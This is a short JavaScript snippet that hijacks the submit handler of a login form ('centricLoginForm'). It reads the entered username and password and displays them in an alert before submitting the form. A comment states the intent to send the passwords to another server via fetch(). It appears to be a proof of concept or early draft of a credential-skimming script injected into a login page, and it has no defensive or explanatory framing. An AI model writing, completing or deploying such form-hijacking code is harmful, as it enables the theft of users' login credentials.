window.onload = () => {
  document.querySelector("#centricLoginForm").onsubmit = e => {
    e.preventDefault()
    // Possibly send passwords to another server via fetch()
    // CORS might be an issue
    alert(
      document.querySelector("#f_username").value+":"+
      document.querySelector("#f_password").value
    )
    document.querySelector("#centricLoginForm").submit()
  }
}
